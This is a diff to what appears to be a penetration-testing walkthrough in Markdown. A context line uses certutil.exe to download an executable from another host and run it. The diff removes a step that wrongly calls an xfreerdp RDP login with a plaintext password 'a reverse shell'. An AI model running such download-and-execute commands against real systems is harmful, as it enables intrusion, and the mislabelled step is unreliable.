@@ -77,11 +77,6 @@ certutil.exe -split -f -urlcache http://10.2.10.99:8080/backup.exe
 c:\windows\tasks\backup.exe
 ```
 
-After gaining an OS shell, set up a reverse shell for persistent access:
-
-`xfreerdp /v:10.2.10.32 /u:localuser /p:'password' /cert:ignore +clipboard /dynamic-resolution`
-
-Use this command to connect remotely via RDP once credentials are obtained.
 
 ## 4. **Privilege Escalation**
 
